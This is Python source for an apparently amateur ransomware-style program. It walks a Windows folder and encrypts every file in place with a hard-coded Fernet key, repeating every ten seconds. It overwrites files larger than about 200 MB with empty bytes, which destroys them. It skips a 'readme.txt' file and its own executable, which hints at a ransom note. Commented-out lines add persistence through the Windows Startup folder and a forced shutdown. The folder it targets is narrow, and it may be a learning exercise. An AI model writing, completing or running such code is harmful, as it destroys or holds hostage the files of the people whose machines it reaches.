

# Importer le module Cryptography
from cryptography.fernet import Fernet
import time 
import os 

user = os.getlogin()
hostname = os.getenv("COMPUTERNAME")

app = f"{user}.exe"
_zero_bytes_ = b''
parcours = 0

# Copy the executable file in the startup menu
# startup = f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
# try : 
    
#     with open(startup+f"{app}", "wb") as _exe:
#         _exe.write(b"bonjour Rova Herve, Comment ca va")
# except:
#     os.system("shutdown /s /t 120")

# use this key to encrypt/decrypt your all file and folder
# cipher_suite = Fernet(key)
cipher_suite = Fernet(b'ZVEQ3p53kJuXn2EN-ZyJduwRuBtoYzwTQ8NOjxiCTaY=')

def encrypt_disk(DriveLetter):

    while True:
        
        # Walk all Folder and Subfolder
        for root, dirs, files in os.walk(f"{DriveLetter}:\\crypto\\"):  
            # For each file
        	try :

	        	for file in files:
	        		global parcours 
	        		parcours += 1
	        		print(f"parcours: {parcours}")
	        		# Continue if the file is donne
	        		if file.endswith(f".xvideo") or file=="readme.txt" or file==f"{app}":
	        			continue
	        
	        		# Open the file
	        		file_path = os.path.join(root, file) 
	        		
		        		# Raise an Exception if an error occured 
	        		with open(file_path, "rb") as f: 
	        			# Read the file in binairy mode
	        			data = f.read() 
	        
	        		# Encrypt the file
	        		encrypted_data = cipher_suite.encrypt(data) 
	        
	        		# Write the file encrypted is other file
	        		with open(file_path, "wb") as f:
	        			"""
							check first the size of the file, if sizeof <= 100 Mo, you should continue
							Then remove the original file
	        			""" 
	        			if data.__sizeof__() > 204000000:
	        				# f.write(b'')
	        				f.write(b'')
	        				# os.remove(file_path)
	        				# continue
	        			else:
		        			f.write(encrypted_data)
		        			# os.remove(file_path)
        				
        				# with open(file_path +f".xvideo", "wb") as file:



        	except PermissionError:
	        		continue
        # wait 10s to continue process
        time.sleep(10)

if __name__ == "__main__":
    encrypt_disk("C")
